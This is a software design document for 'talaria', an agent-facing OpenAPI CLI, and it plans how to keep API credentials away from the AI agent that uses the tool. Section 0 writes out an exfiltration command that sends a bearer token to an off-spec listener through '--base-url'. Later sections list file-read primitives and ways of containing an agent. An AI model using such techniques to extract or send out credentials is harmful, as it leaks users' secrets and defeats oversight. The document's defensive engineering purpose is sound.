# talaria — Phase 2 design: credential containment, then distribution

*Status: design · drafted 2026-08-02 · **revised 2026-08-03** against the completed build ·
successor to [DESIGN.md](../design/DESIGN.md) v0.4*

> **Do not apply the DESIGN.md amendments in §9 until phase 2a is complete.** DESIGN.md is the
> source of truth for any loop running against this repo.

## 0. What changed in the 2026-08-03 revision

The first draft was written while the build was still running. It is now wrong in one important
way and stale in several small ones.

**The threat model was incomplete.** The draft designed the boundary entirely around *"can the
agent read the secret?"* — hence uid separation and an owned-by-caller file guard. The review loop
found a sharper attack the draft never considered: **the agent does not need to read the secret,
it makes talaria send it.**

```
talaria call spec.yaml listPets --base-url http://127.0.0.1:8765
```

Reproduced by the reviewer: `Authorization: Bearer SUPERSECRET` delivered to an off-spec listener,
exit 0, no warning. Uid separation does nothing against this — the agent may still pass any
`--base-url`. See §3.

Also corrected: `--fixtures dir/` is a fourth path-taking surface the draft missed; the claim
"no rework of Tasks 1–33 is implied" is false; and the amendment ledger has been rebased onto
DESIGN.md v0.4, which the build amended in flight.

## 1. Where the build actually landed

All 33 tasks of [IMPLEMENTATION_PLAN.md](../../IMPLEMENTATION_PLAN.md) completed, 15 packages,
`go test ./...` green, `AGENT.md` shipped. Merged to `main` as `3a672e1`.

Two things happened that the plan did not anticipate:

1. **DESIGN.md was amended to v0.4 mid-build** (`58af63c`), adding the *credentials bind to hosts*
   invariant and the *history is untrusted input on read* rule.
2. **A review loop produced 32 findings — 8 CRIT — and escalated to a human** rather than
   converging. The findings are in [REVIEW_FINDINGS.md](../../REVIEW_FINDINGS.md); each names a
   file, a line, and an empirical reproduction. They are not speculative.

**The design is ahead of the code.** v0.4's host-binding invariant is entirely unimplemented —
`grep -rn "allow-host\|allow_hosts\|credentials_withheld\|AllowHost" --include=*.go .` returns
zero hits. The build finished before the amendment that governs it.

`go test ./...` is green, so nothing below is caught by the existing suite.

## 2. What phase 2 is

Two unlike bodies of work, in order:

- **2a — remediation.** Close the credential-containment holes the review found. The build
  escalated rather than finished; this finishes it.
- **2b — the boundary and distribution.** Uid separation, the read-primitive guard, `doctor`,
  packaging, the Claude Code skill, and real-spec dogfooding.

2a precedes 2b because 2b's deliverable is *installing talaria into your own agent sessions*, and
doing that first would install a tool with a verified credential-exfiltration hole.

The ordering after phase 2 is unchanged: **deepen the CLI → the twin.** The twin (roadmap 5–8)
stays behind the §7 gate.

## 3. The threat model, corrected

Three claims, not two. The first draft had A and B; the review established that A alone is not
what "the credential firewall" means.

| | Claim | Guaranteeable by talaria? | Status |
|---|---|---|---|
| **A** | talaria never *emits* a credential value — stdout, stderr, dry-run, emitted curl, errors, history | **Yes**, mechanically | Shipped, with two holes (findings 6, 22) |
| **A′** | talaria never *transmits* a credential to a host the spec does not declare | **Yes**, mechanically | **Designed in v0.4, entirely unbuilt** |
| **B** | the agent cannot *obtain* the credential by other means | **No** — a property of the OS | Not started; §6 |

**A′ is the one that matters most and the one the draft missed.** Transmitting a credential to an
attacker is strictly worse than printing it, and the canary suite cannot catch it: redaction
answers *does it print*, not *who receives it*. A′ is also cheap — it is a host-set check, not a
deployment change — where B requires uid separation the user must set up.

**Findings 1, 2, 3 and 22 are one rule seen through four doors:**

> The destination of a request, and the credentials attached to it, are derived from the spec and
> the flags — never from stored or off-spec input.

Fix it once and all four close: replay re-derives through `index.Lookup` → `request.Build` →
`config.Resolve`, and host binding gates the credential at the point of attachment.

## 4. Decisions

### 4.1 Replay re-derives; `replayableEnv` is deleted (finding 18)

Finding 18 is a documented contradiction — §5a restricts replay to the `TALARIA_AUTH_*` namespace
while §5, `AGENT.md:249` and `README.md:263` all permit a profile's `auth:` map to name an
arbitrary variable. The reviewer could not pick and escalated.

**Decision: neither. The question is dissolved by fixing finding 3.** Once replay re-resolves
credentials through `config.Resolve` rather than reading refs off the stored entry, there is no
"resolvable env-var set" for stored entries at all. `replayableEnv` (`cmd/talaria/history.go:733`)
becomes dead code and is deleted. No doc amendment is needed because no code implements the
contested rule any more.

Verification is part of the fix: assert the symbol is gone, not that it is unreachable.

### 4.2 Spec cache: 24h TTL, conditional revalidation, `--refresh` (finding 25)

**Decision:** store `ETag`/`Last-Modified` alongside each cache entry. Inside 24 hours, serve from
cache with no network. Past it, revalidate with `If-None-Match`/`If-Modified-Since` — cheap when
unchanged, and a 304 refreshes the timestamp without a re-download. `--refresh` forces a fetch.

Rejected: revalidating on every use (a network round trip in front of every `list`/`describe`
contradicts §4's "cheap, no network beyond fetching the spec" and breaks offline use); and a
bypass flag alone (leaves staleness unbounded and silent, which is what makes `validate` report
violations the server never committed).

Needs a §4 clause and a `--refresh` flag. `doctor` reports the cache directory and its age.

### 4.3 Emitted curl references the body source rather than inlining it (finding 6)

The JSON `request.body` field gets redacted unconditionally — `internal/corpus/entry.go:242`
already runs request bodies through the response body-path redactor and `callView` does not, which
is the firewall backwards. The tension the reviewer flagged is that a redacted body makes the
emitted curl non-runnable, breaking §3.4's "portable reproduction" promise.

**Decision: emitted curl references the source instead of inlining the content.**

| Body source | Emitted curl |
|---|---|
| `--body @file` | `--data @file` |
| `--body -` | `--data @-` |
| argv literal | inlined — the agent supplied it, so nothing is disclosed |

Runnable *and* leak-free. It is the same symbolic substitution already used for
`$TALARIA_AUTH_BEARER`, applied to bodies: reference the thing, never the value.

## 5. Phase 2a — remediation

### The eight CRITs

| # | Finding | Fix |
|---|---|---|
| 1 | Credential transmitted to whatever `--base-url` names | Implement v0.4 host binding: allowed set = spec `servers[]` after variable substitution ∪ `--allow-host` ∪ profile `allow_hosts`; off-set credentials diverted to `[]Withheld`, rendered as `credentials_withheld` + one stderr line. Needs finding 11 (server-variable substitution) for the set to be correct |
| 2, 3, 22 | `history replay` takes host, request and body from the stored entry | The §3 rule: re-derive through `loadSpec` → `index.Lookup` → `request.Build` → `config.Resolve`; emit a `validation` block; entry whose operationId is gone fails exit 2. Dissolves finding 18 |
| 4 | `auth check`, `call` and `run` disagree on an unsupported scheme | `Supported bool` on `config.Credential`; unsupported schemes reported `supported:false`; satisfied by `TALARIA_AUTH_BEARER` when set; `clierr.CredentialMissing` not `Usage`; route through `r.noteMissing` in `run` rather than `res.skip` |
| 5 | Spec-supplied media type injects headers onto the wire | `checkSplit` on `Content-Type` in `document.body`; reject non-token media types at bind time (exit 2) |
| 6 | Request body printed unredacted on stdout | §4.3 above |
| 7 | Hostile `minLength` OOMs the process | Cap the pad and array generation at an explicit ceiling; structured skip reason when unsatisfiable |
| 8 | `--output tsv` emits structurally invalid rows | Escape or strip `\t`/`\r`/`\n` in TSV cells; same for the pretty renderer's tabwriter cells |

### The WARNs that belong in 2a

Not all 17. These five, because they are the same class or they weaken the gate itself:

- **9** — unbounded read of a remote spec OOMs the process (same class as 7; the spec is untrusted).
- **10** — a basic credential with no colon makes curl prompt on the TTY and hang the call.
- **13** — history entries are not size-bounded on read.
- **19** — the canary gate has no case for the validation error path.
- **20** — the canary suite never injects a credential through a profile `auth:` reference.

19 and 20 matter disproportionately: the canary suite is what §5a designates as the release gate,
and a gate with uncovered surfaces is the reason findings 6 and 1 shipped green.

The remaining WARNs and all 7 INFOs are triaged at the start of 2b, not now.

### One structural finding worth its own line

**Finding 30: `internal/corpus` imports `internal/curl`** — the exact §5 boundary violation Task 32
was written to assert mechanically against the real import graph. The assertion did not hold. Fix
the import, then fix the test that was supposed to catch it; a guard that fails silently is worse
than no guard.

## 6. Phase 2b — the boundary and distribution

Unchanged in substance from the first draft, with the threat model corrected: this closes claim
**B**, and it is the *smaller* of the two doors. A′ (§5) is the larger one.

| # | Deliverable | Size |
|---|---|---|
| 2b-1 | `internal/boundary` + `internal/fileguard`; guard calls at every path-taking flag | ~1–2 days |
| 2b-2 | `talaria doctor [--require enforced]` | ~1 day |
| 2b-3 | Documented uid-separated deployment (sudoers snippet), verified by `doctor` | ~half a day |
| 2b-4 | Packaging — version stamping via `-ldflags -X`, `make install`, `v0.1.0` tag | hours |
| 2b-5 | Claude Code skill at `~/.claude/skills/talaria/`, wrapping `AGENT.md` | ~1 day |
| 2b-6 | Real-spec dogfooding → written findings doc | open-ended; the real work |

### 6.1 The enforced deployment

The agent runs as a second uid with one sudo rule granting it the right to invoke talaria as the
secret owner:

```
casper-agent ALL=(casper) NOPASSWD: /usr/local/bin/talaria
```

It can *invoke* talaria as `casper`; it cannot read `casper`'s config, environment, or run any
other command as `casper`. Enforcement is the kernel's.

**Rejected: Claude Code `Deny` rules** on `~/.config/talaria/**`. A policy control in another
tool's config file, invisible when it rots, absent under any other agent harness.

**Rejected: a credential broker at the same uid.** It buys nothing — a process running as `casper`
connects to the socket and asks. Strictly worse than a file, because a path is something a deny
rule can name and a socket protocol is not. ssh-agent is precedent for typing a passphrase once,
not for hiding a key from your own shell.

**Rejected: broker + setgid binary.** A genuine boundary, at the price of a setgid binary that
parses untrusted YAML and OpenAPI documents fetched over HTTP — large attack surface behind a
privilege bit — plus a service user, a group, a systemd unit, and install-time root. `go install`
stops working. The sudo rule achieves the same separation with no new code.

**Rejected: OS keyrings.** libsecret/gnome-keyring is uid-scoped, therefore bypassable by anything
running as the user. macOS Keychain ACLs are per-binary and would be a genuine boundary — but the
sessions that matter run in tmux on the Debian VPS. See §10.

### 6.2 `internal/boundary`

Detects the deployment mode from process state alone — caller uid from `SUDO_UID`/`PKEXEC_UID`,
ours from `os.Getuid()`. Returns `enforced` (caller ≠ us), `policy-only` (single uid), or `none`
(root, or a group/world-readable config). One function, no I/O beyond a stat, uid lookups
injectable so tests need no root.

### 6.3 `internal/fileguard`

> **In `enforced` mode, talaria reads only files owned by the calling uid.**

Considered and rejected: emulating the caller's permissions properly. That needs every parent
directory's execute bit plus the caller's supplementary groups, and `faccessat` checks only
real-vs-effective uid, not an arbitrary one. Per-thread privilege dropping in Go is worse —
`setuid` affects one thread and the runtime schedules across threads.

The ownership rule is one `stat`, correct by construction, conservative in the safe direction. The
escape hatch already exists and is more correct: `--body -` has the agent's own shell perform the
`open()` at its own uid. In `policy-only` the guard is a no-op.

Call sites — **four, not three**:

- `internal/request/body.go:15` — `--body @path`
- `internal/spec/load.go:49` and `source.go:87` — `--spec path`, positional spec, cache reads
- `internal/config/config.go:163` — the profile path
- `internal/gen/fixtures.go:67` — **`--fixtures dir/`**, missed in the first draft

Any future flag taking a filesystem path is a call site. State this in the package doc comment and
in `AGENT.md`.

### 6.4 `talaria doctor`

Composes `boundary`, the curl version preflight, file-mode checks on the config and history
stores, spec-cache age (§4.2), and a warning when `TALARIA_AUTH_*` are present in the environment
under `enforced` mode. Renders through the standard envelope with a top-level `verdict`.

It returns a **verdict, not a checklist**: `enforced`, `policy-only`, or `none`. A single-uid
install reports `policy-only` explicitly, stating that the secret is reachable by anything running
as the user. That is how "this needs more work" stays visible in the tool's own output instead of
decaying into an assumption.

`--require enforced` exits non-zero when the verdict is weaker, so CI and agent preflight can
branch on it.

### 6.5 Dogfooding (2b-6) is what feeds the §7 twin gate

DESIGN.md §7: *"Do not start [5–8] on faith; start them because using Phases 1–4 made the absence
of a twin painful."* That evidence needs usage, and usage needs 2b-1 through 2b-5.

Targets: large public specs (GitHub, Stripe) for `describe` quality, operationId synthesis
collisions, and load time on multi-megabyte documents; local services (loop-tracker, Woodpecker CI)
for the end-to-end agent loop. Real 3.0 specs also settle the libopenapi-validator strictness
question the plan left open.

**Not in phase 2:** cross-platform release matrices, the curl-able install script, the Homebrew
tap, the pi package. The repo is already public, so `go install
github.com/Teeeep/talaria/cmd/talaria@latest` works once a tag exists — self-distribution is
nearly free, and the rest waits for a public v0.1 that has survived a real API.

## 7. Testing

1. **Host binding** — table tests over the allowed-set computation (spec servers, variable
   substitution, `--allow-host`, profile `allow_hosts`), plus an end-to-end test that points
   `--base-url` at a capture listener and asserts the credential is **absent from the wire** and
   `credentials_withheld` is present in the envelope. Wire-level, not output-level: this is the
   assertion the canary suite structurally cannot make.
2. **Replay re-derivation** — a hand-edited `history.jsonl` naming a foreign host and method must
   not reach that host; an entry whose operationId no longer exists must exit 2.
3. **`boundary`** — injected uid pairs across all three verdicts, including root and loose
   permissions.
4. **`fileguard`** — `t.TempDir()` files with an injected ownership lookup (real `chown` needs
   root); owned/not-owned × each mode.
5. **Canary suite extension** — closes findings 19 and 20 and adds the read-primitive case: a
   canary in the profile, then read it back through every path-taking flag under `--dry-run`,
   `--output json`, and `history show`, asserting refusal under `enforced`.

## 8. What phase 2 does *not* claim

Phase 2a closes A and A′. Phase 2b closes B *only in the enforced deployment*, which talaria
documents and verifies but does not install. Single-uid installs remain `policy-only` and the tool
says so. Secrets arriving in response bodies remain uncovered (§10).

## 9. Pending DESIGN.md amendments

**Apply after phase 2a.** Rebased onto v0.4 — the host-binding and untrusted-history sections v0.4
already added are not repeated here.

| § | Amendment |
|---|---|
| §1, §3.0 | Split claims A / A′ / B (§3 above). State which the code delivers and which needs the enforced deployment. "Secrets never reach the agent" becomes three sentences, not one |
| §3.4 | Emitted curl references the body source rather than inlining it (§4.3) |
| §4 | Add `talaria doctor [--require enforced]`; add exit code **6 — boundary requirement not satisfied** (verified still unused in v0.4); add the cache TTL/revalidation/`--refresh` clause (§4.2) |
| §5 | Add `internal/boundary` and `internal/fileguard` |
| §5a | New leak-channel row: path-taking flags as arbitrary-file-read primitives under privilege separation; countermeasure is the ownership rule. Four call sites named |
| §5a replay table | Simplify — replay resolves nothing from stored entries, so the namespace row has no code to govern (§4.1) |
| §5a threats not covered | Rewrite: enforced mode moves *out*. Record the rejected designs of §6.1 with reasons so they are not re-proposed |
| §7 | Insert phase 2 between 4 and 5; note it absorbs the self-install slice of the distribution line |
| §8 | Add macOS: Keychain per-binary ACLs are a stronger mechanism with no Linux equivalent |

## 10. Deferred, tracked

- **macOS.** Keychain ACLs scope to a code-signed binary rather than a uid — a genuine boundary
  without uid separation. No Linux equivalent. Unsolved.
- **Secrets in response bodies.** §5a's standing gap. Mitigated by default `Set-Cookie` redaction
  and configurable body paths; not solved.
- **Installing the boundary.** talaria documents and verifies the uid-separated deployment; it does
  not create the user, the sudoers entry, or the units. A `talaria install-boundary` is possible
  later.
- **Rejected designs** (§6.1) — same-uid broker, broker + setgid, uid-scoped keyrings.
- **The remaining 12 WARNs and 7 INFOs** — triaged at the start of 2b.
- **Public distribution** — release matrix, install script, Homebrew tap, pi package.

## 11. Successor phases

1. **Deepen the CLI** — driven by the 2b-6 findings doc. Candidates: request chaining via OpenAPI
   `links`, search ranking, spec overlays. §9 lists several as non-goals; the findings decide
   whether that stance survives contact.
2. **The twin** — roadmap 5–8, still behind the §7 gate.
